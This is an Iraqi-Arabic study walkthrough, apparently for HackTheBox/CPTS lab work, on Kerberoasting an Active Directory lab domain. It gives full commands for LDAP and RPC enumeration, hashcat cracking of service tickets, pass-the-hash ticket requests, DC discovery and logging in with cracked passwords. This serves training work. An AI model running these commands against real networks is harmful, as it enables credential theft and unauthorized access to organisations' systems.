+📌 ليش نسوي هاي الخطوة؟
+
+بروتوكول LDAP هو الدفتر اللي مكتوب بي كل شي بالـ Active Directory. هاي الأداة تسحب كل البيانات وترتبها بملفات HTML و JSON حتى تبحث بيها براحتك.
+
+🔧 الأمر:
+
+Bash
+
+```
+ldapdomaindump -u 'INLANEFREIGHT.LOCAL\htb-student' -p 'HTB_@cademy_stdnt!' 172.16.5.5 -o /tmp/ldap_dump
+```
+
+بعد ما تخلص الأداة، تكدر تبحث عن الحساب بملف الـ JSON:
+
+Bash
+
+```
+cat /tmp/ldap_dump/domain_users.json | python3 -m json.tool | grep -A 20 "SAPService"
+```
+
+**الطريقة الثانية: استخدام crackmapexec عبر LDAP**
+
+📌 ليش نسوي هاي الخطوة؟
+
+أداة CME تعتبر "سكينة سويسرية" للهاكرز. نكدر نستخدمها حتى نوجه استعلام مخصص (Query) يسأل فقط عن اسم مجموعة الحساب اللي نريده، بدون ما نسحب كل بيانات الدومين.
+
+🔧 الأمر:
+
+Bash
+
+```
+crackmapexec ldap 172.16.5.5 -u htb-student -p 'HTB_@cademy_stdnt!' --query "(sAMAccountName=SAPService)" "memberOf"
+```
+
+**الطريقة الثالثة: أدوات Linux الأصلية (rpcclient & ldapsearch)**
+
+📌 ليش نسوي هاي الخطوة؟
+
+مرات تكون ببيئة ما بيها أدوات بايثون ولا Impacket ولا CME. لازم تعتمد على الأدوات المبنية داخل نظام اللينكس أصلاً.
+
+🔧 الأمر (عبر rpcclient):
+
+Bash
+
+```
+rpcclient -U "htb-student%HTB_@cademy_stdnt!" 172.16.5.5
+```
+
+ومن تفتح عندك الشاشة الخاصة بالأداة، تكتب:
+
+Bash
+
+```
+queryuser SAPService
+```
+
+🔧 الأمر (عبر ldapsearch الخام):
+
+Bash
+
+```
+ldapsearch -x -H ldap://172.16.5.5 -D "htb-student@INLANEFREIGHT.LOCAL" -w 'HTB_@cademy_stdnt!' -b "DC=INLANEFREIGHT,DC=LOCAL" "(sAMAccountName=SAPService)" memberOf
+```
+
+📤 الـ Output المتوقع بكل الطرق:
+
+Plaintext
+
+```
+memberOf: CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
+```
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔴 المرحلة 4 (المستوى المتقدم): ماذا لو؟ (The Masterclass Scenarios)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+بامتحان مثل الـ CPTS أو بالواقع، نادراً ما يشتغل كل شي من أول محاولة. هذي أشهر ٥ فخوخ راح تواجهك وطرق تجاوزها:
+
+🔄 **السيناريو الأول: الكارثة الزمنية (Clock Skew)**
+
+تخيل تنفذ أداة `GetUserSPNs.py` ويطلعلك هذا الخطأ:
+
+`[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`
+
+الـ Kerberos بروتوكول مهووس بالوقت (لمنع هجمات الـ Replay). إذا جهازك متأخر أو متقدم عن وقت الـ Domain Controller بأكثر من **5 دقائق**، الـ DC راح يرفض يتكلم وياك نهائياً!
+
+✅ **الحل:** زامن وقت جهازك مع وقت السيرفر حصراً.
+
+Bash
+
+```
+sudo apt-get install ntpdate -y
+sudo ntpdate 172.16.5.5
+```
+
+إذا أداة `ntpdate` مسدودة أو ما تشتغل، عدل الوقت يدوياً:
+
+Bash
+
+```
+sudo timedatectl set-ntp false
+sudo timedatectl set-time "2026-07-29 14:35:00"
+```
+
+🔄 **السيناريو الثاني: كلمة المرور المستعصية (Layered Cracking)**
+
+خلص ملف `rockyou.txt` وطلعلك `Status: Exhausted` والنتيجة `0/1`. شسوي؟
+
+✅ **الحل:** استخدم استراتيجية الطبقات (Layering):
+
+الطبقة ١ (جربناها): `rockyou.txt` مع `best64.rule`
+
+الطبقة ٢: استخدم قاعدة تحوير أعنف (Dive Rule) تولد ملايين الاحتمالات لكل كلمة:
+
+Bash
+
+```
+hashcat -m 13100 SAPService_tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule --force
+```
+
+الطبقة ٣: هجوم الدمج (Combination Attack). ندمج كلمتين سوية (مثل Admin + 2026 = Admin2026):
+
+Bash
+
+```
+hashcat -m 13100 SAPService_tgs.txt -a 1 /usr/share/wordlists/rockyou.txt /opt/SecLists/Passwords/Common-Credentials/common-passwords-win.txt --force
+```
+
+الطبقة ٤: هجوم مخصص (Target-Specific). الأجانب يسموه Spidering. نستخدم أداة `cewl` حتى تسحب كل الكلمات الموجودة بموقع الشركة، ونجربها لأن الموظفين يحبون يستخدمون اسم شركتهم بالباسوردات:
+
+Bash
+
+```
+cewl https://inlanefreight.com -d 3 -m 5 -o inlanefreight_wordlist.txt
+hashcat -m 13100 SAPService_tgs.txt inlanefreight_wordlist.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+🔄 **السيناريو الثالث: عندك NTLM Hash بس ما عندك الباسورد (Pass-the-Hash Kerberoasting)**
+
+تخيل اخترقت جهاز ولقيت الهاش مال `htb-student` بالذاكرة، بس ما قدرت تكسره. هل تكدر تطلب TGS بدون الباسورد الصريح؟
+
+الجواب: إي نعم! أدوات Impacket تدعم الـ Pass-the-Hash.
+
+الـ Format المطلوب بالأداة هو `LM:NT`. لأن الويندوز الحديث ما يستخدم `LM`، نعوض مكانه بالهاش الفارغ الثابت عالمياً: `aad3b435b51404eeaad3b435b51404ee`.
+
+✅ **الحل:**
+
+Bash
+
+```
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student -hashes aad3b435b51404eeaad3b435b51404ee:<الهاش_اللي_لگيته_هنا> -request-user SAPService -outputfile SAPService_tgs.txt
+```
+
+🔄 **السيناريو الرابع: ما تعرف الـ IP مال الـ Domain Controller**
+
+بالتحدي هو أنطاك الـ IP `172.16.5.5`. بالواقع، أنت تنزل بشبكة عمياء. شلون تلكي الـ DC؟
+
+الـ DC هو السيرفر الوحيد بالشبكة اللي يفتح بورت `88` (Kerberos).
+
+✅ **الحل الأسرع (عن طريق nmap):**
+
+Bash
+
+```
+sudo nmap -p 88 172.16.5.0/24 --open -oG - | grep "88/open"
+```
+
+✅ **الحل الأدق (عن طريق DNS SRV Records):**
+
+Bash
+
+```
+nslookup -type=SRV _kerberos._tcp.INLANEFREIGHT.LOCAL
+```
+
+🔄 **السيناريو الخامس: الباسورد المكسور ما يشتغل! (Authentication Failures)**
+
+كسرت التذكرة والباسورد طلع `!SapperFi3ld`. رحت تجربه بـ CME وانطاك `STATUS_LOGON_FAILURE`. شنو الخلل؟
+
+الخلل بالـ Linux Shell (Terminal) مالتك مو بالباسورد!
+
+علامة التعجب `!` والرموز مثل `$` التيرمنال يعتبرها متغيرات برمجية (Variables) ويحاول يترجمها قبل لا يرسلها للويندوز، فالباسورد يوصل غلط.
+
+✅ **الحل:**
+
+دائماً، دائماً حوّط أي باسورد بي رموز غريبة بـ **Single Quotes (' ')** مو Double Quotes (" ").
+
+الخطأ:
+
+Bash
+
+```
+crackmapexec smb 172.16.5.5 -u SAPService -p "!SapperFi3ld"
+```
+
+الصح:
+
+Bash
+
+```
+crackmapexec smb 172.16.5.5 -u SAPService -p '!SapperFi3ld'
+```
+
+وإذا الباسورد نفسه يحتوي على Single Quote (مثلاً `It'sPassword`)، لازم تسويله Escape:
+
+Bash
+
+```
+crackmapexec smb 172.16.5.5 -u SAPService -p $'It\'sPassword'
+```
+
+وإذا استمر الرفض بالـ SMB، جرب تاخذ TGT وتدخل عن طريق Kerberos بدل الـ NTLM:
+
+Bash
+
+```
+getTGT.py INLANEFREIGHT.LOCAL/SAPService:'!SapperFi3ld' -dc-ip 172.16.5.5
+export KRB5CCNAME=SAPService.ccache
+crackmapexec smb 172.16.5.5 -u SAPService -k --no-pass
+```
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🎯 الخلاصة النهائية (Wrap-up)
+
+بهذا الجزء المتقدم، غطينا النقاط اللي تميز المخترق الحقيقي:
+
+١. ما نعتمد على أداة وحدة للاستكشاف (استخدمنا LDAP و RPC).
+
+٢. فهمنا أهمية التزامن الزمني للـ Kerberos.
+
+٣. تعلمنا شلون نتجاوز حدود الـ Wordlists بطرق متقدمة مثل `cewl` و `dive.rule`.
+
+٤. طبقنا مفهوم الـ Pass-the-Hash لسرقة تذاكر بدون باسورد.
+
+٥. حلينا مشكلة الترجمة الخاطئة للرموز باللينكس (Single Quotes).
+
+إذا طبقت هاي الخطوات والسيناريوهات، ماكو تحدي Kerberoasting بـ HackTheBox أو بامتحان CPTS راح يوكف بوجهك. عاشت ايدك بطل! 💪
+
+
+]
 
 ```text
 ╔══════════════════════════════════════════════════════════════════════╗
